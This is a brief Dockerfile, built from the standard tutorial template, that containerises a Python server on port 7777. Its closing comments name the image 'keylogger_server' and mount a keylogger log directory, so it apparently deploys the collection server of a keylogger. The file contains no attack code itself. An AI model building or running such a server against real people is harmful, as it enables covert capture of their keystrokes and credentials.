# Use an official Python runtime as a parent image
FROM python:3

# Set the working directory to /app
WORKDIR /app

# Copy the current directory contents into the container at /app
COPY . /app

# Install any needed packages specified in requirements.txt
# RUN pip install --trusted-host pypi.python.org -r requirements.txt

# Make port 7777 available to the world outside this container
EXPOSE 7777

# Define environment variable
ENV NAME World

# Run app.py when the container launches
CMD ["python", "server.py"]

# docker build -t keylogger_server .
# docker run -v /Keylogger/log:/app/log --name=keylogger_server -p 7799:7777 keylogger_server

